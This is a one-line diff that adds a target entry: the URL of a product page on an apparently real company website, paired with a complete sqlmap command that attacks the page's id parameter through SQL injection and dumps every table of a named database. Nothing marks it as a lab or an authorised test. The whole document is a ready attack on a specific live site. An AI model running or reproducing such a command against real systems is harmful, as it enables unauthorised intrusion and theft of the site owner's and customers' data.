@@ -1,0 +1,1 @@
+https://alvaroprima.co.id/product.php?id=16 (GET)  # sqlmap.py -u https://alvaroprima.co.id/product.php?id=16 --batch -D u410070197_alvaro --dump-all --output-dir=sqlmap_output
